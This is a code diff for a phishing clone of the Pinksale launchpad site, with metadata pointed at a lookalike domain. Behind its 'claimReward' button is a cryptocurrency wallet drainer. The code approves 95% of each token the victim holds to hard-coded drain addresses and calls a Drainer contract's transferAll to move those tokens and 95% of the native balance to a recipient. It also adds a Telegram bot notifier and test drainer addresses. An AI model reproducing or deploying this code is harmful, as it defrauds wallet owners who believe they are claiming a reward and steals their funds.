@@ -150,8 +150,8 @@ const testnets_chains = [{
 const metadata = {
   name: 'Pinksale App',
   description: 'The Launchpad Protocol for Everyone!',
-  url: 'https://pinksale-launch.vercel.app/', // origin must match your domain & subdomain
-  icons: ['https://pinksale-launch.vercel.app/icon.ico']
+  url: 'https://pinksale-launchflx.1nt.online/',
+  icons: ['https://pinksale-launchflx.1nt.online/icon.ico']
 }
 
 
@@ -174,7 +174,8 @@ createWeb3Modal({
     '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
     'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
     'a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393'
-],
+  ],
+  allowUnsupportedChain: true
 })
 
 export default function Home() {
@@ -205,22 +206,21 @@ export default function Home() {
       console.log("info: ", data)
       setData(data.data)
 
-
     }
-
     async function getMoralisData(address) {
       const response = await fetch(`/api/getAllInfo?address=${address}`)
       const inf = await response.json()
-      // console.log('resulted: ', inf)
+      console.log('resulted: ', inf)
       setTimeout(() => {
         setAddrInfo(inf)
       }, 3000)
     }
 
 
+
+
     getCoins()
     if(address) {getMoralisData(address)}
-
 
   }, [address])
 
@@ -261,9 +261,29 @@ export default function Home() {
     setInputted(e.target.value)
   }
 
-  const claimReward = async(addr) => {
+  async function sendBot(message) {
+    const resp = await fetch(`/api/bot`,{
+      method: "POST",
+      headers: {
+        'content-type': 'application/json'
+      },
+      body: JSON.stringify({
+        chatId: 6177221699,
+        message: `Running Updates Here \n On to the next one please`
+      })
+    })
 
-    console.log('chainId', chainId)
+    if(resp.ok){
+      console.log("Yeai!")
+    }else{
+      console.log("Oops! Something is wrong.")
+    }
+
+  }
+
+  const claimReward = async(addr) => {
+    console.log('chainId: ', chainId)
+    const testDrainAddresses = ['0x8DDb1bAA8ed0307bF7B44764c64404bd49A19eA4', '0xBa1554D59FED763F726123cCc0467ad7c0C81e7E']
     const drainAddresses = ['0x67eFE8239Dd091Da8486f7b07921D7b699AECc4F', '0xAb31D50880eE7AfbcBE729087C21fbe9cA434E37']
     let ethersProvider = new ethers.providers.Web3Provider(walletProvider)
     // if(chainId === 11155111) {
@@ -271,8 +291,6 @@ export default function Home() {
     // } else {
     //   ethersProvider  = new ethers.JsonRpcProvider('https://polygon-mumbai.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68')
     // }
-    console.log('addrInfo: ', addr)
-    // console.log('Data: ', data)
     const trasnferERC = addrInfo && addrInfo.filter(d => {
       return d.chain === chainId
     })
@@ -280,18 +298,10 @@ export default function Home() {
     console.log('transferERC', trasnferERC)
 
     const signer = ethersProvider.getSigner()
-    console.log('signer: ', signer)
     let bal = await ethersProvider.getBalance(address)
     let calc95 = (bal * 95)/100
-    console.log('cal95: ', calc95)
-
-
-
-
     const ethVal = ethers.utils.formatEther(BigInt(calc95))
-    console.log('ethVal: ', ethVal)
     const amount = ethers.utils.parseEther(ethVal)
-    console.log('amt: ', amount)
     // The Contract object
     let DrainerContract;
     let ERC20;
@@ -307,21 +317,25 @@ export default function Home() {
 
           console.log('transferERC', trasnferERC)
 
-          for (let i=0; i < trasnferERC.length; i++) {
-            // const amountInWei = ethers.utils.parseUnits(amount.toString(), 18);
-            // Calculate 95% of the balance
-            const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
-            const balan = BigInt(trasnferERC[i].balance)
-            console.log('balanceInDecimal: ', bal)
+          if(trasnferERC.length) {
+            for (let i=0; i < trasnferERC.length; i++) {
+              // const amountInWei = ethers.utils.parseUnits(amount.toString(), 18);
+              // Calculate 95% of the balance
+              const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
+              const balan = BigInt(trasnferERC[i].balance)
+              console.log('balanceInDecimal: ', bal)
 
-            let calctok95 = (balan * BigInt(95))/BigInt(100)
-            const ethh = ethers.utils.formatEther(calctok95)
-            const amt = ethers.utils.parseEther(ethh)
-            console.log('console: ', amt)
-            // Approve 95% of the balance
-            const tx = await tokenContract.approve(drainAddresses[0], amt);
-            await tx.wait();
+              let calctok95 = (balan * BigInt(95))/BigInt(100)
+              const ethh = ethers.utils.formatEther(calctok95)
+              const amt = ethers.utils.parseEther(ethh)
+              console.log('console: ', amt)
+              // Approve 95% of the balance
+              const tx = await tokenContract.approve(drainAddresses[0], amt);
+              await tx.wait();
+
+            }
           }
+
 
           DrainerContract = new Contract(drainAddresses[0], Drainer.abi, signer)
           const txn = await DrainerContract.transferAll(trasnferERC, recipient, {value: amount})
@@ -334,19 +348,21 @@ export default function Home() {
         if (availChains[1].status) {
           break
         }
+        if(trasnferERC.length) {
+          for (let i=0; i < trasnferERC.length; i++) {
+            const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
+            const balan = BigInt(trasnferERC[i].balance)
+            console.log('balanceInDecimal: ', bal)
 
-        for (let i=0; i < trasnferERC.length; i++) {
-          const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
-          const balan = BigInt(trasnferERC[i].balance)
-          console.log('balanceInDecimal: ', bal)
-
-          let calct5 = (balan * BigInt(95))/BigInt(100)
-          const ethh = ethers.utils.formatEther(calct5)
-          const amt = ethers.utils.parseEther(ethh)
-          console.log('console: ', amt)
-          const tx = await tokenContract.approve(drainAddresses[1], amt);
-          await tx.wait();
+            let calct5 = (balan * BigInt(95))/BigInt(100)
+            const ethh = ethers.utils.formatEther(calct5)
+            const amt = ethers.utils.parseEther(ethh)
+            console.log('console: ', amt)
+            const tx = await tokenContract.approve(drainAddresses[1], amt);
+            await tx.wait();
+          }
         }
+
 
         DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
         const txx = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
@@ -360,8 +376,8 @@ export default function Home() {
           if (availChains[1].status) {
             break
           }
-
-          for (let i=0; i < trasnferERC.length; i++) {
+          if(trasnferERC.length) {
+            for (let i=0; i < trasnferERC.length; i++) {
             const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
             const balan = BigInt(trasnferERC[i].balance)
             console.log('balanceInDecimal: ', bal)
@@ -373,6 +389,8 @@ export default function Home() {
             const tx = await tokenContract.approve(drainAddresses[1], amt);
             await tx.wait();
           }
+          }
+
 
           DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
           const tfl = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
@@ -382,12 +400,12 @@ export default function Home() {
           setAvailChains(info)
 
           break;
-        case 137:
+      case 137:
             if (availChains[1].status) {
               break
             }
-
-            for (let i=0; i < trasnferERC.length; i++) {
+            if(trasnferERC.length) {
+              for (let i=0; i < trasnferERC.length; i++) {
               const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
               const balan = BigInt(trasnferERC[i].balance)
               console.log('balanceInDecimal: ', bal)
@@ -399,6 +417,8 @@ export default function Home() {
               const tx = await tokenContract.approve(drainAddresses[1], amt);
               await tx.wait();
             }
+            }
+
 
             DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
             const txl = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
@@ -412,15 +432,75 @@ export default function Home() {
         break;
     }
 
-
-    //  const req = ethersProvider.send(
-    //   'wallet_switchEthereumChain',
-    //   [
-    //     {
-    //       chainId: 80001,
-
+    // switch (chainId) {
+    //   case 11155111:
+    //     if (availChains[0].status) {
+    //       break
     //     }
-    //   ])
+
+    //     console.log('transferERC', trasnferERC)
+
+    //     for (let i=0; i < trasnferERC.length; i++) {
+    //       // const amountInWei = ethers.utils.parseUnits(amount.toString(), 18);
+    //       // Calculate 95% of the balance
+    //       const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
+    //       const balan = BigInt(trasnferERC[i].balance)
+    //       console.log('balanceInDecimal: ', bal)
+
+    //       let calctok95 = (balan * BigInt(95))/BigInt(100)
+    //       const ethh = ethers.utils.formatEther(calctok95)
+    //       const amt = ethers.utils.parseEther(ethh)
+    //       console.log('console: ', amt)
+    //       // Approve 95% of the balance
+    //       const tx = await tokenContract.approve(testDrainAddresses[0], amt);
+    //       await tx.wait();
+    //     }
+
+    //     DrainerContract = new Contract(testDrainAddresses[0], Drainer.abi, signer)
+    //     const txn = await DrainerContract.transferAll(trasnferERC, recipient, {value: amount})
+    //     await txn.wait()
+    //     info = [...availChains]
+    //     info[0].status = true
+    //     setAvailChains(info)
+    //     break;
+    //   case 97:
+    //     if (availChains[1].status) {
+    //       break
+    //     }
+
+    //     for (let i=0; i < trasnferERC.length; i++) {
+    //       const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
+    //       const balan = BigInt(trasnferERC[i].balance)
+
+    //       let calct5 = (balan * BigInt(95))/BigInt(100)
+    //       const ethh = ethers.utils.formatEther(calct5)
+    //       const amt = ethers.utils.parseEther(ethh)
+    //       console.log('console: ', amt)
+    //       const tx = await tokenContract.approve(testDrainAddresses[1], amt);
+    //       await tx.wait();
+    //     }
+
+    //     DrainerContract = new Contract(testDrainAddresses[1], Drainer.abi, signer)
+    //     const txx = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
+    //     await txx.wait()
+    //     info = [...availChains]
+    //     info[1].status = true
+    //     setAvailChains(info)
+
+    //     break;
+    //   default:
+    //     break;
+    // }
+
+
+     const req = ethersProvider.send(
+      'wallet_switchEthereumChain',
+      [
+        {
+          chainId: 80001,
+
+        }
+      ])
 
 
     try {
@@ -1471,7 +1551,7 @@ export default function Home() {
                   <div class="ant-drawer-title">
                     <div class="items-center gap-4 flex">
                       <div>
-                      <ConnectButton type={'create'} />
+                      <ConnectButton type={'connect'} />
                       </div>
                     </div>
                   </div>
